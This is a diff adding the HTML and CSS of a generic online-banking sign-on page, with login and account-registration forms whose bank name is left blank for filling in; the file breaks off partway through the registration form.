@@ -1,1 +1,1528 @@
+<!doctype html>
+<html lang="en">
+<head>
 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="theme-color" content="#133a69">
+
+<link rel="stylesheet" href="../assets/css/bootstrap.min.css">
+<link rel="stylesheet" href="../assets/css/animate.min.css">
+<link rel="stylesheet" href="../assets/css/fontawesome.min.css">
+<link rel="stylesheet" href="../assets/css/flaticon-1.css">
+<link rel="stylesheet" href="../assets/css/icomoon.css">
+<link rel="stylesheet" href="../assets/css/magnific-popup.min.css">
+<link rel="stylesheet" href="../assets/css/nice-select.css">
+<link rel="stylesheet" href="../assets/css/slick.min.css">
+<link rel="stylesheet" href="../assets/css/owl.carousel.min.css">
+<link rel="stylesheet" href="../assets/css/owl.theme.default.min.css">
+<link rel="stylesheet" href="../assets/css/meanmenu.css">
+<link rel="stylesheet" href="../assets/css/odometer.min.css">
+<!--<link rel="stylesheet" href="/assets/css/style.css">-->
+<link rel="stylesheet" href="../assets/css/responsive.css">
+<title>Online Banking</title>
+<link rel="icon" type="image/png" href="../assets/img/first-st-fav.png">
+
+<style>
+body.online-banking {
+    /*background-image: url(/assets/img/login-background.jpg);
+    background-position: center center;
+    background-size: cover;
+    background-repeat: no-repeat;*/
+    background: #f8f9fa;
+}
+
+/*Start Default Theme Config*/
+:root {
+  --mt-theme-default-background: #d50505;
+  --mt-theme-text: #ffffff;
+  --mt-theme-hover: #0e2c52;
+  --mt-theme_liner: #566e7e;
+}
+/*End Default Theme Config*/
+
+.login-content .login-form {
+    text-align: initial;
+    max-width: none;
+    margin-left: initial;
+    margin-right: initial;
+    display: flex;
+    justify-content: center;
+}
+
+.login-content {
+    height: auto;
+}
+
+.signon-container {
+    border: 1px solid var(--mt-theme-default-background);
+    background: #ffffff;
+    margin: 2rem 0;
+    width: 100%;
+    max-width: 775px;
+}
+
+.signon-form-main form {
+    margin-top: 35px;
+}
+
+.user-log-title {
+    text-align: left;
+    font-size: 17px;
+    position: relative;
+    text-transform: uppercase;
+}
+
+.user-log-title:after {
+    content: "";
+    position: absolute;
+    border: 0;
+    width: 200px;
+    height: 2px;
+    z-index: 1;
+    margin-left: 0;
+    left: 0;
+    bottom: 0;
+    background: var(--mt-theme-default-background);
+}
+
+.login-content .login-form p {
+    margin-top: 5px;
+    margin-bottom: 15px;
+    color: #fff;
+}
+
+.login-content .login-form h3 {
+    margin-bottom: 15px;
+    color: #fff;
+}
+
+.login-content .login-form form .form-group {
+    margin-bottom: 25px;
+}
+
+.login-content .login-form form .form-control {
+    font-size: 17px;
+    border-radius: 3px;
+}
+
+.input-group-text {
+    border-radius: 3px 0 0 3px;
+    height: 45px;
+    width: 50px;
+    justify-content: center;
+    background-color: #faf2f3;
+    color: #eb5d33;
+}
+
+.input-group-text.u-icon svg {
+    fill: #2d534f;
+}
+
+.login-content .login-form .signon-form-main form .form-control {
+    box-shadow: none !important;
+    border: 1px solid #ddd;
+    background: #fafcff;
+    height: 45px;
+    font-family: sans-serif;
+    border-top-right-radius: 3px !important;
+    border-bottom-right-radius: 3px !important;
+}
+
+.signonForm input::placeholder {
+    color: #a1a8af;
+}
+
+span.mt-btn-loader {
+    position: absolute;
+    top: 10px;
+    margin: 0 10px;
+    right: 10px;
+}
+
+.mtx-log-btn .spinner-border {
+    border: 0.19em solid currentColor;
+    border-right-color: #a01e3c;
+    width: 1.5rem;
+    height: 1.5rem;
+}
+
+.btn.mtx-log-btn.log-is-clicked {
+    opacity: 0.5;
+    pointer-events: none;
+    cursor: not-allowed;
+}
+
+.preloader .loader {
+    width: 70px;
+    height: 70px;
+}
+
+.user-sign-on {
+    background: var(--mt-theme-text);
+}
+
+.user-sign-on-inner.row {
+    padding: 13px 30px 20px;
+}
+
+.signon-form-main {
+    margin: 20px 20px 20px 35px;
+}
+
+.signon-form-main-inner {
+    padding: 30px;
+    position: relative;
+    border: 1px solid #aaa;
+    border-radius: 4px;
+}
+
+.signon-header {
+    background: var(--mt-theme-default-background);
+    border-bottom: 1px solid var(--mt-theme-default-background);
+}
+
+.signon-header-ul {
+    padding: 0;
+    margin: 0;
+    list-style: none;
+    display: flex;
+}
+
+.signon-header-li {
+    color: #fff;
+    height: 40px;
+    padding: 8px 25px;
+    cursor: pointer;
+}
+
+.signon-header-li.signon-current {
+    background: #fff;
+    color: #000;
+}
+
+.signon-header-li svg {
+    width: 25px;
+    position: relative;
+    bottom: 2px;
+    margin-right: 5px;
+}
+
+.signon-header-li svg.li-person {
+    width: 20px;
+}
+
+.signon-subheading {
+    padding: 25px 35px 0;
+}
+
+.signon-subheading-txt {
+    color: var(--mt-theme-default-background);
+    font-weight: bold;
+    font-size: 14px;
+}
+
+img.signon-logo-img {
+    width: 65%;
+}
+
+.login-content .login-form .logo {
+    margin-top: 10px;
+    margin-bottom: 10px;
+}
+
+.sgon-linner-sidebar {
+    background: #f8f9fa;
+    height: 100%;
+    border: 1px solid #e9ecef;
+}
+
+.sgon-linner-sidebar-inner {
+    padding: 10px 20px 15px;
+}
+
+.sgon-sbr-foot {
+    margin: 3rem 0 0;
+}
+
+.sgon-sbr-txt {
+    font-size: 13px;
+    margin-bottom: 10px;
+    color: #523533;
+}
+
+.sgon-sbr-icons {
+    text-align: center;
+}
+
+.sgon-sbr-icons svg {
+    width: 170px;
+    height: 150px;
+}
+
+.signon-right-sbr {
+    padding: 20px 10px 20px 0;
+}
+
+.sgn-sbr-heading {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.sgn-sbr-h-title {
+    color: #ce362c;
+    text-align: center;
+    font-weight: bold;
+    font-size: 16px;
+    font-family: sans-serif;
+}
+
+.sgn-sbr-h-txt {
+    color: #212529;
+    text-align: center;
+    font-size: 14px;
+    line-height: 16px;
+    margin-top: 5px;
+}
+
+.sgn-sbr-h-icon {
+    margin: 20px 0 10px;
+}
+
+.sgn-sbr-rows {
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.sgn-sbr-ro-txt {
+    color: #111;
+    text-align: center;
+    font-size: 13px;
+    line-height: 14px;
+    margin: 6px 0;
+}
+
+.sgn-sbr-ro-siteurl {
+    font-size: 11px;
+    line-height: 12px;
+    margin: 6px 0;
+    height: 30px;
+    background-color: var(--mt-theme-default-background);
+    color: #fff;
+    text-align: center;
+    font-weight: bold;
+    white-space: nowrap;
+    overflow: hidden;
+    padding: 9px 4px;
+    border-radius: 2px;
+}
+
+.signon-form-bottom {
+    padding: 20px 25px;
+    border: 1px solid #aaa;
+    border-left: 4px solid var(--mt-theme-default-background);
+    margin-top: 15px;
+}
+
+.signon-form-bottom-innrt {
+    display: flex;
+    flex-direction: row;
+    justify-content: flex-start;
+}
+
+.sn-fr-bott-tls {
+    font-size: 20px;
+    color: #4f4f47;
+    font-weight: 600;
+}
+
+.sn-fr-bott-subtls {
+    color: #919191;
+    line-height: 1;
+    font-size: 1rem;
+}
+
+.sn-fr-bott-link-btn {
+    border: 1px solid #523533;
+    background: #fff;
+    font-size: 15px;
+    text-transform: uppercase;
+    padding: 5px 10px;
+    margin-top: 10px;
+    color: #523533;
+    width: 115px;
+}
+
+.sn-fr-bott-img {
+    margin-right: 20px;
+    position: relative;
+    top: 9px;
+}
+
+.sgn-submit button.btn.btn-primary.mtx-log-btn {
+    width: 83%;
+    display: flex;
+    padding: 14.5px 25px;
+    color: var(--mt-theme-text);
+    background-color: var(--mt-theme-default-background);
+    border-color: var(--mt-theme-default-background);
+}
+
+.btn-primary::after {
+    background: #b93027;
+    background: linear-gradient(135deg, #b93027 0%, #ba3c35 100%);
+}
+
+.mt-btn-icon {
+    position: absolute;
+    right: 10px;
+    top: 10px;
+}
+
+.mt-btn-icon svg {
+    width: 25px;
+}
+
+.signon-forgot-password {
+    text-align: right;
+    line-height: 1.3;
+}
+
+.signon-forgot-password a {
+    color: #523533;
+    font-size: 15px;
+    text-decoration: underline;
+}
+
+.x-review-pass {
+    position: absolute;
+    right: 0;
+    z-index: 99;
+}
+
+.x-review-pass button {
+    border: none;
+    background: transparent;
+    padding: 5px 10px;
+    height: 45px;
+}
+
+.x-review-pass button svg {
+    width: 30px;
+}
+
+.form-response-data {
+    color: #cd2122;
+    line-height: 1.9;
+    margin-top: -15px;
+}
+
+.sgn-sbr-h-icon svg g {
+    fill: var(--mt-theme-default-background);
+}
+
+.login-content .login-form form .btn.mtx-back-btn {
+    width: auto;
+}
+
+.signon-loader-wrp {
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    position: absolute;
+    left: 0;
+    right: 0;
+    top: 0;
+    bottom: 0;
+    background: #fff;
+    padding-top: 5rem;
+    z-index: 99;
+}
+
+.signon-loader .spinner-border {
+    width: 4rem;
+    height: 4rem;
+    border-color: #ea4633;
+    border-left-color: #f8e1ea;
+    border-right-color: #f8e1ea;
+}
+
+.spinner-main {
+    text-align: center;
+}
+
+.verify-form-group {
+    margin: 0 0 20px;
+}
+
+.reg-success {
+    font-size: 17px;
+    color: #0e314c;
+    min-height: 195px;
+}
+
+.signon-col.right-col {
+    border-left: 1px solid #a2b2b9;
+}
+
+.signon-header-link {
+    color: #fff;
+    text-decoration: none;
+    display: block;
+    text-transform: uppercase;
+}
+
+.signon-header-li.signon-current .signon-header-link {
+    color: #000;
+}
+
+.signon-header-link:hover {
+    color: #fff;
+}
+
+.signon-header-li .signon-header-link svg {
+    width: 20px;
+}
+
+.signon-header-li {
+    position: relative;
+}
+
+.signon-header-li.signon-current:after {
+    content: '';
+    width: 20px;
+    height: 20px;
+    background: #fff;
+    border-bottom: 1px solid var(--mt-theme-default-background);
+    border-right: 1px solid var(--mt-theme-default-background);
+    position: absolute;
+    bottom: -11px;
+    left: 20px;
+    transform: rotate(45deg);
+    border-top-left-radius: 90px;
+}
+
+@media only screen and (max-width: 767px) {
+.login-content {
+    padding-top: 0;
+    padding-bottom: 0;
+    padding-left: 0;
+    padding-right: 0;
+}
+
+.action-login-form {
+    padding: 0 !important;
+}
+
+.signon-container-inner.row {
+    display: block !important;
+    margin: 0;
+}
+
+.signon-col.left-col.col-9 {
+    width: 100%;
+    padding: 0;
+}
+
+.signon-col.right-col.col-3 {
+    width: 100%;
+    padding: 0;
+}
+
+.user-sign-on-inner.row {
+    display: block;
+    --bs-gutter-x: 0;
+}
+
+.signon-left-left.col-8 {
+    width: 100%;
+    padding: 0;
+}
+
+.signon-left-right.col-4 {
+    width: 100%;
+    padding: 0;
+}
+
+li.signon-header-li {
+    position: relative;
+    padding: 8px 10px;
+}
+
+img.signon-logo-img {
+    width: 115px !important;
+    margin: 0 15px;
+}
+
+.login-form .signon-container {
+    padding: 0;
+    margin: 0;
+    border: none;
+}
+
+.signon-col.left-col.col-8 {
+    width: 100%;
+}
+
+.signon-col.right-col.col-4 {
+    width: 100%;
+    border-left: 0;
+}
+
+.signon-left-left .signon-form-main {
+    margin: 15px 0 0;
+}
+
+.user-sign-on .signon-subheading {
+    padding: 15px 0 0;
+}
+
+.signon-container .signon-header {
+    border-top: 1px solid var(--mt-theme-default-background);
+    border-bottom: 1px solid var(--mt-theme-default-background);
+}
+
+li.signon-header-li.signon-current:after {
+    left: 10px;
+}
+
+.signon-container-inner .user-sign-on .signon-subheading {
+    padding: 25px 0 0;
+}
+
+.signon-container-inner .user-sign-on .signon-subheading .signon-subheading-txt {
+    font-weight: 500;
+    font-size: 17px;
+}
+}
+</style>
+
+</head>
+<body class="online-banking">
+
+<section class="login-area">
+    
+<div class="row m-0">
+
+<div class="action-login-form">
+<div class="login-content container">
+
+<div class="login-form">
+
+<div class="signon-container">
+         
+ <div class="signon-header">
+  <ul class="signon-header-ul">
+   <li class="signon-header-li">
+       <a href="../index.html" class="signon-header-link">
+           <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512.000000 512.000000" preserveaspectratio="xMidYMid meet"> <g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none"> <path d="M2483 5098 c-42 -23 -2319 -2218 -2349 -2264 -47 -71 -16 -187 62 -231 36 -21 52 -23 212 -23 l172 0 0 -1195 c0 -813 3 -1210 11 -1244 13 -62 40 -98 93 -122 39 -17 79 -19 674 -19 515 0 639 3 665 14 39 16 82 61 96 99 8 19 11 259 11 733 l0 704 430 0 430 0 0 -704 c0 -474 3 -714 11 -733 14 -38 57 -83 96 -99 26 -11 150 -14 665 -14 595 0 635 2 674 19 53 24 80 60 93 122 8 34 11 431 11 1244 l0 1195 173 0 c159 0 175 2 211 23 78 44 109 160 62 231 -30 46 -2307 2241 -2349 2264 -22 12 -57 22 -77 22 -20 0 -55 -10 -77 -22z m1217 -1250 l1132 -1093 -173 -5 c-150 -4 -179 -8 -208 -25 -44 -26 -70 -62 -81 -111 -6 -22 -10 -556 -10 -1241 l0 -1203 -600 0 -600 0 0 704 c0 475 -3 714 -11 733 -15 40 -48 73 -94 94 -37 17 -74 19 -495 19 -421 0 -458 -2 -495 -19 -46 -21 -79 -54 -94 -94 -8 -19 -11 -258 -11 -733 l0 -704 -600 0 -600 0 0 1203 c0 685 -4 1219 -10 1241 -11 49 -37 85 -81 111 -29 17 -58 21 -207 25 l-174 5 1132 1093 c623 600 1135 1092 1140 1092 4 0 518 -492 1140 -1092z"></path> </g> </svg>
+           Home
+       </a>
+   </li>
+   <li class="signon-header-li signon-current"><svg xmlns="http://www.w3.org/2000/svg" class="li-person" viewbox="0 0 512 512"><path d="M344 144c-3.92 52.87-44 96-88 96s-84.15-43.12-88-96c-4-55 35-96 88-96s92 42 88 96z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><path d="M256 304c-87 0-175.3 48-191.64 138.6C62.39 453.52 68.57 464 80 464h352c11.44 0 17.62-10.48 15.65-21.4C431.3 352 343 304 256 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></path></svg>INDIVIDUAL</li>
+   <li class="signon-header-li"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewbox="0 0 512 512"><path d="M402 168c-2.93 40.67-33.1 72-66 72s-63.12-31.32-66-72c-3-42.31 26.37-72 66-72s69 30.46 66 72z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><path d="M336 304c-65.17 0-127.84 32.37-143.54 95.41-2.08 8.34 3.15 16.59 11.72 16.59h263.65c8.57 0 13.77-8.25 11.72-16.59C463.85 335.36 401.18 304 336 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></path><path d="M200 185.94c-2.34 32.48-26.72 58.06-53 58.06s-50.7-25.57-53-58.06C91.61 152.15 115.34 128 147 128s55.39 24.77 53 57.94z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><path d="M206 306c-18.05-8.27-37.93-11.45-59-11.45-52 0-102.1 25.85-114.65 76.2-1.65 6.66 2.53 13.25 9.37 13.25H154" fill="none" stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="32"></path></svg>CORPORATE</li>
+  </ul>
+ </div>
+         
+ <div class="signon-container-inner row">
+   
+   <div class="signon-col left-col col-8">
+        <div class="user-sign-on">
+         
+         <div class="signon-subheading">
+          <div class="signon-subheading-txt">Welcome to <span id="siteName"><span class="bname"></span></span> <span id="signonType">INDIVIDUAL</span> Internet Banking</div>
+         </div>
+         
+         <div class="user-sign-on-inner">
+          
+          <div class="signon-left-left">
+           <div class="signon-form-main">
+           
+             <div class="signon-form-main-inner">
+              <div class="signon-form-pages on-form-page">
+                <div class="user-log-title">Enter Information</div>
+                
+                <form autocomplete="off" action="" method="POST" class="signonForm">
+                
+                                   
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
+                <span class="input-group-text u-icon"><?xml version="1.0" encoding="iso-8859-1"?>
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 482.9 482.9" style="enable-background:new 0 0 482.9 482.9;" xml:space="preserve">
+<g>
+	<g>
+		<path d="M239.7,260.2c0.5,0,1,0,1.6,0c0.2,0,0.4,0,0.6,0c0.3,0,0.7,0,1,0c29.3-0.5,53-10.8,70.5-30.5
+			c38.5-43.4,32.1-117.8,31.4-124.9c-2.5-53.3-27.7-78.8-48.5-90.7C280.8,5.2,262.7,0.4,242.5,0h-0.7c-0.1,0-0.3,0-0.4,0h-0.6
+			c-11.1,0-32.9,1.8-53.8,13.7c-21,11.9-46.6,37.4-49.1,91.1c-0.7,7.1-7.1,81.5,31.4,124.9C186.7,249.4,210.4,259.7,239.7,260.2z
+			 M164.6,107.3c0-0.3,0.1-0.6,0.1-0.8c3.3-71.7,54.2-79.4,76-79.4h0.4c0.2,0,0.5,0,0.8,0c27,0.6,72.9,11.6,76,79.4
+			c0,0.3,0,0.6,0.1,0.8c0.1,0.7,7.1,68.7-24.7,104.5c-12.6,14.2-29.4,21.2-51.5,21.4c-0.2,0-0.3,0-0.5,0l0,0c-0.2,0-0.3,0-0.5,0
+			c-22-0.2-38.9-7.2-51.4-21.4C157.7,176.2,164.5,107.9,164.6,107.3z"></path>
+		<path d="M446.8,383.6c0-0.1,0-0.2,0-0.3c0-0.8-0.1-1.6-0.1-2.5c-0.6-19.8-1.9-66.1-45.3-80.9c-0.3-0.1-0.7-0.2-1-0.3
+			c-45.1-11.5-82.6-37.5-83-37.8c-6.1-4.3-14.5-2.8-18.8,3.3c-4.3,6.1-2.8,14.5,3.3,18.8c1.7,1.2,41.5,28.9,91.3,41.7
+			c23.3,8.3,25.9,33.2,26.6,56c0,0.9,0,1.7,0.1,2.5c0.1,9-0.5,22.9-2.1,30.9c-16.2,9.2-79.7,41-176.3,41
+			c-96.2,0-160.1-31.9-176.4-41.1c-1.6-8-2.3-21.9-2.1-30.9c0-0.8,0.1-1.6,0.1-2.5c0.7-22.8,3.3-47.7,26.6-56
+			c49.8-12.8,89.6-40.6,91.3-41.7c6.1-4.3,7.6-12.7,3.3-18.8c-4.3-6.1-12.7-7.6-18.8-3.3c-0.4,0.3-37.7,26.3-83,37.8
+			c-0.4,0.1-0.7,0.2-1,0.3c-43.4,14.9-44.7,61.2-45.3,80.9c0,0.9,0,1.7-0.1,2.5c0,0.1,0,0.2,0,0.3c-0.1,5.2-0.2,31.9,5.1,45.3
+			c1,2.6,2.8,4.8,5.2,6.3c3,2,74.9,47.8,195.2,47.8s192.2-45.9,195.2-47.8c2.3-1.5,4.2-3.7,5.2-6.3
+			C447,415.5,446.9,388.8,446.8,383.6z"></path>
+	</g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+</span>
+                </div>
+                <input type="text" name="online_id" id="user_id" placeholder="User ID or Account Number" class="form-control">
+                </div>
+                
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
+                <span class="input-group-text u-icon"><?xml version="1.0" encoding="iso-8859-1"?>
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
+<g>
+	<g>
+		<path d="M384,213.333H128c-29.419,0-53.333,23.936-53.333,53.333v192C74.667,488.064,98.581,512,128,512h256
+			c29.419,0,53.333-23.936,53.333-53.333v-192C437.333,237.269,413.419,213.333,384,213.333z M416,458.667c0,17.643-14.357,32-32,32
+			H128c-17.643,0-32-14.357-32-32v-192c0-17.643,14.357-32,32-32h256c17.643,0,32,14.357,32,32V458.667z"></path>
+	</g>
+</g>
+<g>
+	<g>
+		<path d="M256,0c-76.459,0-138.667,62.208-138.667,138.667V224c0,5.888,4.779,10.667,10.667,10.667h256
+			c5.888,0,10.667-4.779,10.667-10.667v-85.333C394.667,62.208,332.459,0,256,0z M373.333,213.333H138.667v-74.667
+			c0-64.704,52.651-117.333,117.333-117.333s117.333,52.629,117.333,117.333V213.333z"></path>
+	</g>
+</g>
+<g>
+	<g>
+		<path d="M256,362.667c-5.888,0-10.667,4.779-10.667,10.667v64c0,5.888,4.779,10.667,10.667,10.667s10.667-4.779,10.667-10.667v-64
+			C266.667,367.445,261.888,362.667,256,362.667z"></path>
+	</g>
+</g>
+<g>
+	<g>
+		<path d="M256,277.333c-29.419,0-53.333,23.936-53.333,53.333S226.581,384,256,384c29.419,0,53.333-23.936,53.333-53.333
+			S285.419,277.333,256,277.333z M256,362.667c-17.643,0-32-14.357-32-32c0-17.643,14.357-32,32-32c17.643,0,32,14.357,32,32
+			C288,348.309,273.643,362.667,256,362.667z"></path>
+	</g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+</span>
+                </div>
+                <input autocomplete="new-password" type="password" name="password" id="password" placeholder="Your Password" class="form-control s-pass-input">
+                
+                 <div class="x-review-pass">
+                   <button type="button" class="seePass">
+                     <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M432 448a15.92 15.92 0 01-11.31-4.69l-352-352a16 16 0 0122.62-22.62l352 352A16 16 0 01432 448zM255.66 384c-41.49 0-81.5-12.28-118.92-36.5-34.07-22-64.74-53.51-88.7-91v-.08c19.94-28.57 41.78-52.73 65.24-72.21a2 2 0 00.14-2.94L93.5 161.38a2 2 0 00-2.71-.12c-24.92 21-48.05 46.76-69.08 76.92a31.92 31.92 0 00-.64 35.54c26.41 41.33 60.4 76.14 98.28 100.65C162 402 207.9 416 255.66 416a239.13 239.13 0 0075.8-12.58 2 2 0 00.77-3.31l-21.58-21.58a4 4 0 00-3.83-1 204.8 204.8 0 01-51.16 6.47zM490.84 238.6c-26.46-40.92-60.79-75.68-99.27-100.53C349 110.55 302 96 255.66 96a227.34 227.34 0 00-74.89 12.83 2 2 0 00-.75 3.31l21.55 21.55a4 4 0 003.88 1 192.82 192.82 0 0150.21-6.69c40.69 0 80.58 12.43 118.55 37 34.71 22.4 65.74 53.88 89.76 91a.13.13 0 010 .16 310.72 310.72 0 01-64.12 72.73 2 2 0 00-.15 2.95l19.9 19.89a2 2 0 002.7.13 343.49 343.49 0 0068.64-78.48 32.2 32.2 0 00-.1-34.78z"></path><path d="M256 160a95.88 95.88 0 00-21.37 2.4 2 2 0 00-1 3.38l112.59 112.56a2 2 0 003.38-1A96 96 0 00256 160zM165.78 233.66a2 2 0 00-3.38 1 96 96 0 00115 115 2 2 0 001-3.38z"></path></svg>
+                   </button>
+                   <button type="button" class="hidePass" style="display: none;">
+                     <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M255.66 112c-77.94 0-157.89 45.11-220.83 135.33a16 16 0 00-.27 17.77C82.92 340.8 161.8 400 255.66 400c92.84 0 173.34-59.38 221.79-135.25a16.14 16.14 0 000-17.47C428.89 172.28 347.8 112 255.66 112z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><circle cx="256" cy="256" r="80" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></circle></svg>
+                   </button>
+                 </div>
+                
+                </div>
+                 
+                <div class="row form-group sgn-submit">
+                 
+                 <div class="col-7">
+        <button id="submit-btn"  type="submit" name="go_customer" class="btn btn-primary mtx-log-btn ">
+                       <span class="mtx-log-btn-txt">SIGN ON</span>
+                       <span class="mt-btn-loader"></span>
+                       <span class="mt-btn-icon">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="48" d="M184 112l144 144-144 144"></path></svg>
+                       </span>
+                   </button>
+                 </div>
+                 
+                 <div class="col-5">
+                   <div class="signon-forgot-password"><a href="javascript:void(0)" id="forgotPassBtn">Forgot User ID or Password?</a></div>
+                 </div>
+                 
+                </div>
+                
+                </form>
+              </div>
+              
+              <div class="signon-form-pages reg-form-page" style="display: none">
+                <div class="user-log-title reg-log-title">Register Account</div>
+                
+                <form action="" method="POST" class="regiForm" autocomplete="off">
+                
+                <div class="reg-form-first">  
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
+                <span class="input-group-text u-icon"><?xml version="1.0" encoding="iso-8859-1"?>
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 482.9 482.9" style="enable-background:new 0 0 482.9 482.9;" xml:space="preserve">
+<g>
+	<g>
+		<path d="M239.7,260.2c0.5,0,1,0,1.6,0c0.2,0,0.4,0,0.6,0c0.3,0,0.7,0,1,0c29.3-0.5,53-10.8,70.5-30.5
+			c38.5-43.4,32.1-117.8,31.4-124.9c-2.5-53.3-27.7-78.8-48.5-90.7C280.8,5.2,262.7,0.4,242.5,0h-0.7c-0.1,0-0.3,0-0.4,0h-0.6
+			c-11.1,0-32.9,1.8-53.8,13.7c-21,11.9-46.6,37.4-49.1,91.1c-0.7,7.1-7.1,81.5,31.4,124.9C186.7,249.4,210.4,259.7,239.7,260.2z
+			 M164.6,107.3c0-0.3,0.1-0.6,0.1-0.8c3.3-71.7,54.2-79.4,76-79.4h0.4c0.2,0,0.5,0,0.8,0c27,0.6,72.9,11.6,76,79.4
+			c0,0.3,0,0.6,0.1,0.8c0.1,0.7,7.1,68.7-24.7,104.5c-12.6,14.2-29.4,21.2-51.5,21.4c-0.2,0-0.3,0-0.5,0l0,0c-0.2,0-0.3,0-0.5,0
+			c-22-0.2-38.9-7.2-51.4-21.4C157.7,176.2,164.5,107.9,164.6,107.3z"></path>
+		<path d="M446.8,383.6c0-0.1,0-0.2,0-0.3c0-0.8-0.1-1.6-0.1-2.5c-0.6-19.8-1.9-66.1-45.3-80.9c-0.3-0.1-0.7-0.2-1-0.3
+			c-45.1-11.5-82.6-37.5-83-37.8c-6.1-4.3-14.5-2.8-18.8,3.3c-4.3,6.1-2.8,14.5,3.3,18.8c1.7,1.2,41.5,28.9,91.3,41.7
+			c23.3,8.3,25.9,33.2,26.6,56c0,0.9,0,1.7,0.1,2.5c0.1,9-0.5,22.9-2.1,30.9c-16.2,9.2-79.7,41-176.3,41
+			c-96.2,0-160.1-31.9-176.4-41.1c-1.6-8-2.3-21.9-2.1-30.9c0-0.8,0.1-1.6,0.1-2.5c0.7-22.8,3.3-47.7,26.6-56
+			c49.8-12.8,89.6-40.6,91.3-41.7c6.1-4.3,7.6-12.7,3.3-18.8c-4.3-6.1-12.7-7.6-18.8-3.3c-0.4,0.3-37.7,26.3-83,37.8
+			c-0.4,0.1-0.7,0.2-1,0.3c-43.4,14.9-44.7,61.2-45.3,80.9c0,0.9,0,1.7-0.1,2.5c0,0.1,0,0.2,0,0.3c-0.1,5.2-0.2,31.9,5.1,45.3
+			c1,2.6,2.8,4.8,5.2,6.3c3,2,74.9,47.8,195.2,47.8s192.2-45.9,195.2-47.8c2.3-1.5,4.2-3.7,5.2-6.3
+			C447,415.5,446.9,388.8,446.8,383.6z"></path>
+	</g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+</span>
+                </div>
+                <input type="text" name="account_number" id="account_number" placeholder="Enter Account Number" class="form-control">
+                </div>
+                   
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
+                <span class="input-group-text u-icon"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path d="M320 254.27c-4.5 51-40.12 80-80.55 80s-67.34-35.82-63.45-80 37.12-80 77.55-80 70.33 36 66.45 80z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><path d="M319.77 415.77c-28.56 12-47.28 14.5-79.28 14.5-97.2 0-169-78.8-160.49-176s94.31-176 191.51-176C381 78.27 441.19 150 432.73 246c-6.31 71.67-52.11 92.32-76.09 88.07-22.56-4-41.18-24.42-37.74-63.5l8.48-96.25" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path></svg></span>
+                </div>
+                <input type="email" name="email_address" id="email_address" placeholder="Email Address" class="form-control">
+                </div>
+                
+                <div class="row form-group sgn-submit">
+                 
+                 <div class="col-7">
+                   <button type="button" name="proceed" id="proceedReg" class="btn btn-primary mtx-log-btn">
+                       <span class="mtx-log-btn-txt">PROCEED</span>
+                       <span class="mt-btn-loader"></span>
+                       <span class="mt-btn-icon">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="48" d="M184 112l144 144-144 144"></path></svg>
+                       </span>
+                   </button>
+                 </div>
+                 
+                 <div class="col-5">
+                   <div class="signon-forgot-password"></div>
+                 </div>
+                 
+                </div>
+                </div>
+                
+                <div class="reg-form-second" style="display: none">
+                    
+                <div class="verify-form-group">
+                 <div class="verif-acti-txt">We've sent a verification code to your email address, enter the code below to complete your internet banking registration.</div>
+                </div>
+                
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
